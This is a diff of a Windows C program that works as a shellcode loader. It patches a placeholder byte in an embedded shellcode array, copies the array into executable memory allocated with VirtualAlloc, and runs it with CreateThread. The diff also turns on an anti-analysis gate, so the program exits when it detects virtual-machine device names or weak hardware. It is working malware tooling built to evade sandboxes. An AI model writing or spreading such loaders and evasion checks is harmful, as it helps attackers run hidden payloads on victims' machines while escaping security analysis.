@@ -46,21 +46,25 @@ void Run()
 		"\xf2\xe3\x2e\x6f\xd3\xda\xba\xf5\x0f\x65\x13\x78\x3e\x12"
 		"\xec\x53\x93\xa2\xd1";
 
-	char first[] = "\x48"; // correct value
+	// Correct value
+	char first[] = "\x48";
 
 	PVOID pCode = VirtualAlloc(0, sizeof code, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	
+	// Replace bad byte
 	RtlCopyMemory(code, first, sizeof first);
 	RtlCopyMemory(pCode, code, sizeof code);
+	
 	DWORD threadID;
+	
 	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)pCode, NULL, 0, &threadID);
 	WaitForSingleObject(hThread, INFINITE);
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
 {
-	if (!SystemHasSufficientHardware()) return 0;
-	//if (SystemHasVmDeviceNames()) return 0;
-
+	if (!SystemHasSufficientHardware() || SystemHasVmDeviceNames()) return 0;
+	
 	Run();
 	return 0;
 }
